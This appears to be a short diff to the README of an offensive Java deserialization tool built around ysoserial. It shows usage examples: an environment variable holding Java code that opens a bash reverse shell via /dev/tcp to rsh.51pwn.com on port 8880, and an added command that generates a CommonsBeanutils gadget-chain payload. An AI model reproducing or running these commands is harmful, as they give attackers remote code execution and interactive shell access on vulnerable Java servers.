@@ -22,6 +22,7 @@ java -jar $mtx/../tools/ysoserial-all.jar CommonsCollections5js "var x=new java.
 eg:
 ```
 export Custom_Code_51pwn='java.lang.Runtime.getRuntime().exec(new String[]{"bash" ,"-c" ,"exec bash -i &>/dev/tcp/rsh.51pwn.com/8880 <&1"});'
+java -jar $mtx/../tools/ysoserial-all.jar CommonsBeanutils192NOCC "CLASS:ScriptEngineTemplate"
 ```
 - Allows java fragment code injection to be obtained from the current directory file **Custom_Code_51pwn** to solve complex problems
 ```
